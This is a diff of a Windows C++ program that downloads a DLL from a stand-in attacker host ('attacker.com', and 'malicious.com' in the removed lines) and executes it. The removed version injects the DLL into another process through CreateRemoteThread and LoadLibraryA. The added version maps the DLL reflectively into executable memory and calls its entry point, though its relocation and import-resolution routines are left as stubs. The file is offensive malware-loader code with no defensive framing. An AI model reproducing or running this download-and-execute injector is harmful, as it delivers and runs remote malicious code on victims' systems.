@@ -1,69 +1,100 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <windows.h>
-#include <tlhelp32.h>
+#include "pch.h"
+#include <iostream>
+#include <Windows.h>
 #include <urlmon.h> // For URLDownloadToFile
+
+// Link with Urlmon.lib
 #pragma comment(lib, "urlmon.lib")
 
-const char* dllURL = "http://malicious.com/test.dll"; // URL of the malicious DLL
+typedef struct BASE_RELOCATION_BLOCK {
+    DWORD PageAddress;
+    DWORD BlockSize;
+} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
 
-int main(int argc, char* argv[]) {
+typedef struct BASE_RELOCATION_ENTRY {
+    USHORT Offset : 12;
+    USHORT Type : 4;
+} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
+
+using DLLEntry = BOOL(WINAPI *)(HINSTANCE dll, DWORD reason, LPVOID reserved);
+
+const char* dllURL = "http://attacker.com/malicious.dll";
+
+// Function to download DLL from URL
+HRESULT DownloadDLL(const char* url, const char* filePath) {
+    return URLDownloadToFile(NULL, url, filePath, 0, NULL);
+}
+
+// Function to perform image base relocations
+void PerformImageBaseRelocations(LPVOID dllBase, PIMAGE_NT_HEADERS ntHeaders, DWORD_PTR deltaImageBase) {
+    // Implementation omitted for brevity
+}
+
+// Function to resolve import address table
+void ResolveImportAddressTable(LPVOID dllBase, PIMAGE_NT_HEADERS ntHeaders) {
+    // Implementation omitted for brevity
+}
+
+int main() {
     // Download the DLL file
-    HRESULT hr = URLDownloadToFile(NULL, dllURL, "C:\\path\\test.dll", 0, NULL);
+    HRESULT hr = DownloadDLL(dllURL, "C:\\Path\\malicious.dll");
     if (FAILED(hr)) {
-        printf("Failed to download DLL: 0x%x\n", hr); // Print error code if download fails
+        printf("Failed to download DLL: 0x%x\n", hr);
         return 1;
     }
 
-    // Continue with the injection process
-    HANDLE phandle; // Process handle
-    HANDLE rthread; // Remote thread
-    LPVOID rbuffer; // Remote buffer
-
-    // Get a handle to kernel32.dll and retrieve the address of LoadLibraryA function
-    HMODULE hKernel32 = GetModuleHandle("Kernel32");
-    VOID* lb = GetProcAddress(hKernel32, "LoadLibraryA");
-
-    // Parse the process ID we provide
-    if (atoi(argv[1]) == 0) {
-        printf("PID not found :( exiting...\n");
-        return -1;
+    // Load DLL into memory
+    HANDLE dll = CreateFileA("C:\\Path\\malicious.dll", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
+    if (dll == INVALID_HANDLE_VALUE) {
+        printf("Failed to open DLL file\n");
+        return 1;
     }
 
-    // Open the target process
-    phandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
-    if (phandle == NULL) {
-        printf("Failed to open target process. Error code: %d\n", GetLastError()); // Print error if failed to open process
-        return -1;
+    DWORD64 dllSize = GetFileSize(dll, NULL);
+    LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);
+    if (dllBytes == NULL) {
+        printf("Memory allocation failed\n");
+        CloseHandle(dll);
+        return 1;
     }
 
-    // Allocate memory buffer in the target process for DLL path
-    rbuffer = VirtualAllocEx(phandle, NULL, strlen("C:\\path\\test.dll") + 1, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-    if (rbuffer == NULL) {
-        printf("Failed to allocate memory in target process. Error code: %d\n", GetLastError()); // Print error if memory allocation fails
-        CloseHandle(phandle);
-        return -1;
+    DWORD outSize = 0;
+    if (!ReadFile(dll, dllBytes, dllSize, &outSize, NULL)) {
+        printf("Failed to read DLL file\n");
+        HeapFree(GetProcessHeap(), 0, dllBytes);
+        CloseHandle(dll);
+        return 1;
     }
 
-    // Copy DLL file path to the allocated memory in the target process
-    if (!WriteProcessMemory(phandle, rbuffer, "C:\\path\\test.dll", strlen("C:\\path\\test.dll") + 1, NULL)) {
-        printf("Failed to write to target process memory. Error code: %d\n", GetLastError()); // Print error if memory writing fails
-        VirtualFreeEx(phandle, rbuffer, 0, MEM_RELEASE);
-        CloseHandle(phandle);
-        return -1;
+    // Get pointers to in-memory DLL headers
+    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
+    SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;
+
+    // Allocate new memory space for the DLL
+    LPVOID dllBase = VirtualAlloc(NULL, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (dllBase == NULL) {
+        printf("Virtual memory allocation failed\n");
+        HeapFree(GetProcessHeap(), 0, dllBytes);
+        CloseHandle(dll);
+        return 1;
     }
 
-    // Create a remote thread in the target process to load the DLL
-    rthread = CreateRemoteThread(phandle, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rbuffer, 0, NULL);
-    if (rthread == NULL) {
-        printf("Failed to create remote thread in target process. Error code: %d\n", GetLastError()); // Print error if thread creation fails
-        VirtualFreeEx(phandle, rbuffer, 0, MEM_RELEASE);
-        CloseHandle(phandle);
-        return -1;
-    }
+    // Perform image base relocations
+    DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
+    PerformImageBaseRelocations(dllBase, ntHeaders, deltaImageBase);
 
-    CloseHandle(phandle); // Close the process handle
+    // Resolve import address table
+    ResolveImportAddressTable(dllBase, ntHeaders);
+
+    // Execute the loaded DLL
+    DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
+    (*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);
+
+    // Clean up resources
+    HeapFree(GetProcessHeap(), 0, dllBytes);
+    CloseHandle(dll);
+
     return 0;
 }
 
